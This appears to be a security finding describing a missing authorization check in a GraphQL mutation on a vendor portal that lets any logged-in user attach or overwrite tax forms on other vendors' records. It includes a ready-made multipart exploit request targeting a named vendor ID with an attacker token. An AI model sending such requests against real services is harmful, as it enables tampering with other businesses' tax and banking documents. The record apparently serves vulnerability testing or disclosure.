diagnosis: The Strawberry GraphQL mutation attach_vendor_tax_form attaches tax documents (e.g. W-9 forms containing tax identification numbers and banking coordinates) to an arbitrary vendor_id. The resolver checks authentication but does not verify that current_user has an active business relationship with or authorization for vendor_id, permitting malicious document injection and overwriting on competitor vendor records.
exploit_request:
POST /graphql HTTP/1.1
Host: vendor-portal.fintech.io
Authorization: Bearer <attacker_jwt>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZ

------WebKitFormBoundaryZ
Content-Disposition: form-data; name="operations"

{"query": "mutation ($doc: Upload!) { attachVendorTaxForm(vendorId: \"vnd_enterprise_991\", document: $doc) { vendorId documentId status } }", "variables": {"doc": null}}
------WebKitFormBoundaryZ

{"0": ["variables.doc"]}
